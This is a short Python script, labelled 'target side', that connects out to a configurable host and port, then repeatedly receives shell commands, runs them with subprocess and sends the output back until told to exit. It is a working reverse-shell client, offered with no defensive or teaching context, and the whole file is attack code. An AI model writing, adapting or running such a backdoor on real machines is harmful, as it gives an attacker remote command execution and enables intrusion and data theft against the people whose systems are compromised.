# target side
import subprocess
import socket

# config connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("127.0.0.1", 9090))#change this

while 1:
    com = s.recv(1024)
    
    if com.decode('utf-8').lower() == 'exit':
        break

    output = subprocess.getoutput(com.decode('utf-8'))
    s.send(output.encode('utf-8'))

s.close()